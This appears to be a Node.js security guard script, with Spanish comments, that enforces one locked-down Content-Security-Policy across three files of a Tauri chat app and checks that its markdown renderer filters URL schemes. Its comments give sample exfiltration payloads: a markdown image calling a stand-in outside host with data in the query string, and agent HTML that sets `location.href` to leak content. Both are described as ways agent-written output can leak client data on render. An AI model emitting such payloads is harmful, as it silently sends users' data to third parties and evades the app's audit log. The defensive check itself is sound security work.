#!/usr/bin/env node
/**
 * La política de la ventana dice lo mismo en los tres sitios, y no se afloja.
 *
 * **Existe porque el defecto que cierra no da error.** La ventana del chat pinta
 * markdown que escribió un agente sobre material del cliente. Con la política en
 * `null` —como estuvo—, un `![](http://ajeno/?d=…)` dispara el GET al pintarse,
 * sin un clic y sin una línea en `publications.jsonl`. Nada falla, nada se ve, y
 * La app promete que todo lo que sale queda anotado. El ataque y su
 * control negativo: `tests/security/window.mjs`.
 *
 * Y una política se afloja sola con el tiempo: alguien mete un `img-src *` para
 * que se vea un avatar, y la puerta vuelve a estar abierta sin que nadie lo note
 * — porque **abrirla no rompe nada**. Por eso esto no comprueba un texto: comprueba
 * propiedades, y cada una nombra lo que se pierde si se cae.
 *
 * ## Los tres sitios, y por qué son tres
 *
 * | Dónde | Cuándo gobierna |
 * |---|---|
 * | `src-tauri/tauri.conf.json` | En producción: Tauri la manda como cabecera del recurso |
 * | `index.html` | En desarrollo, donde la ventana carga del servidor de Vite y Tauri no llega a poner nada |
 * | `tests/security/window.html` | En el laboratorio: si no es la misma, lo que salga ahí no dice nada de la app |
 *
 * Las dos primeras se aplican **a la vez** en producción, y dos políticas se
 * intersecan. Si divergen, lo que gobierna es la más estricta de cada directiva y
 * ya nadie sabe cuál es la política de verdad leyendo un archivo.
 */
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

const raiz = (p) => fileURLToPath(new URL(`../../${p}`, import.meta.url));

const SITIOS = [
  ["src-tauri/tauri.conf.json", (t) => JSON.parse(t).app?.security?.csp],
  ["index.html", (t) => t.match(/http-equiv="Content-Security-Policy"\s*\n?\s*content="([^"]*)"/)?.[1]],
  ["tests/security/window.html", (t) => t.match(/http-equiv="Content-Security-Policy"\s*\n?\s*content="([^"]*)"/)?.[1]],
];

/**
 * Qué puede decir cada directiva, y qué se pierde si dice más.
 *
 * Es una lista de lo que pasa, no de lo que se rechaza: una directiva que gane un
 * origen nuevo falla aunque ese origen parezca inofensivo. `null` significa que la
 * directiva puede traer lo que sea salvo lo que prohíbe `VETADO`, y hoy solo lo
 * usan las dos que tienen que dejar correr al contenedor de artefactos.
 */
const PERMITIDO = {
  "default-src": ["'self'"],
  // Sin `'unsafe-inline'` ni `'unsafe-eval'`: cierra los manejadores en atributo
  // y `eval`. Lo que ejecuta inline entra por `script-src-elem`, y solo por ahí.
  "script-src": ["'self'"],
  // La concesión cara: un marco `srcdoc` HEREDA esta política, y el contenedor de
  // artefactos está diseñado para correr el JavaScript del agente dentro. Medido:
  // sin ella la vista previa se queda muerta en los dos motores.
  "script-src-elem": ["'self'", "'unsafe-inline'"],
  "style-src": ["'self'", "'unsafe-inline'"],
  // Nada remoto: una imagen remota exfiltra sin JavaScript ni clic, con el
  // contenido en la URL. `terminus-image` lee del disco (`local_image.rs`), con
  // sus dos formas como el IPC: `terminus-image:` y `http://….localhost`.
  "img-src": ["'self'", "data:", "terminus-image:", "http://terminus-image.localhost"],
  "font-src": ["'self'", "data:"],
  "media-src": ["'self'", "data:"],
  // Las dos formas de la misma URL del IPC de Tauri: `ipc://localhost` en macOS y
  // Linux, `http://ipc.localhost` en Windows (`scripts/ipc-protocol.js` de la
  // caja de Tauri). Sin ellas cada `invoke` falla y cae a `postMessage`.
  // Y el plano de control de Danil Machines: con la cuenta abierta la ventana lista las
  // computadoras de la persona y abre su sesión del relay (`features/machines/account.tsx`).
  "connect-src": ["'self'", "ipc:", "http://ipc.localhost", "https://computers.danil.ai", "wss://computers.danil.ai"],
  // El tercer candado del contenedor: a dónde puede navegar un marco hijo. Sin
  // esto el HTML del agente hace `location.href = "http://…/?" + contenido`.
  // `terminus-page` es la vista previa de un `.html` de la tarea (`page_preview.rs`):
  // sirve solo archivos de su carpeta: navegar ahí no saca nada.
  "frame-src": ["'self'", "terminus-page:", "http://terminus-page.localhost"],
  "object-src": ["'none'"],
  // Las dos que NO heredan de `default-src`: sin escribirlas quedan abiertas.
  "base-uri": ["'none'"],
  "form-action": ["'none'"],
};

/** Comodines que vacían una directiva de contenido aunque parezca que dice algo. */
const VETADO = [/^\*$/, /^https?:$/, /^data:$/, /^ws{1,2}:$/, /^'unsafe-eval'$/, /^blob:$/];

const failures = [];
const textos = new Map();

for (const [archivo, leer] of SITIOS) {
  let politica;
  try {
    politica = leer(readFileSync(raiz(archivo), "utf8"));
  } catch (e) {
    failures.push(`${archivo}: no se pudo leer — ${e.message}`);
    continue;
  }
  if (!politica) {
    failures.push(`${archivo}: no declara ninguna política de contenido`);
    continue;
  }
  textos.set(archivo, politica.trim());
}

// 1 · Los tres dicen exactamente lo mismo.
const distintos = new Set(textos.values());
if (distintos.size > 1) {
  failures.push("los tres sitios no dicen la misma política:");
  for (const [archivo, t] of textos) failures.push(`    ${archivo}\n        ${t}`);
}

// 2 · Y lo que dicen no se ha aflojado.
const politica = textos.get("index.html");
if (politica) {
  const directivas = new Map(
    politica
      .split(";")
      .map((d) => d.trim())
      .filter(Boolean)
      .map((d) => {
        const [nombre, ...fuentes] = d.split(/\s+/);
        return [nombre.toLowerCase(), fuentes];
      }),
  );

  for (const [nombre, permitido] of Object.entries(PERMITIDO)) {
    const fuentes = directivas.get(nombre);
    if (!fuentes) {
      failures.push(`falta \`${nombre}\`, que tenía que decir: ${permitido.join(" ")}`);
      continue;
    }
    for (const f of fuentes) {
      if (permitido.includes(f)) continue;
      // El mismo fallo, pero el comodín se nombra por lo que es: `data:` en
      // `img-src` está permitido y en `script-src` sería una vía de ejecución, así
      // que la lista de la directiva manda y esto solo elige el mensaje.
      if (VETADO.some((v) => v.test(f))) {
        failures.push(`\`${nombre}\` acepta \`${f}\`, que es un comodín: la directiva deja de contener nada`);
      } else {
        failures.push(`\`${nombre}\` ganó \`${f}\`, que no estaba. Solo puede decir: ${permitido.join(" ")}`);
      }
    }
  }

  for (const nombre of directivas.keys()) {
    if (!(nombre in PERMITIDO)) failures.push(`\`${nombre}\` no está en la lista de este guarda: decide qué puede decir`);
  }
}

// 3 · Y el filtro del chat sigue en su sitio. La política es la segunda capa; la
//     primera es que `Markdown.tsx` no pinte un destino que ejecute. Las dos se
//     midieron por separado, y ninguna de las dos basta sola.
const md = readFileSync(raiz("src/ui/Markdown.tsx"), "utf8");
if (!/destinoAbrible|imagenInerte/.test(md)) {
  failures.push("src/ui/Markdown.tsx ya no filtra el esquema: no usa `destinoAbrible` ni `imagenInerte`");
}
for (const crudo of ["href={p.href}", "src={p.src}"]) {
  if (md.includes(crudo)) {
    failures.push(`src/ui/Markdown.tsx pinta \`${crudo}\` tal cual — eso es lo que dejaba salir la imagen sin un clic`);
  }
}

if (failures.length === 0) {
  console.log("La política de la ventana dice lo mismo en los tres sitios, y el chat filtra el esquema.");
  process.exit(0);
}

for (const f of failures) console.error(`  ${f}`);
console.error(
  `\nLo que esta política impide está medido, con su control negativo, en\n` +
    `\`tests/security/window.mjs\`. Si hace falta aflojarla, la forma de saberlo es\n` +
    `correr eso antes y después — no discutirlo: un permiso de más no rompe nada\n` +
    `visible, y por eso vuelve solo.`,
);
process.exit(1);
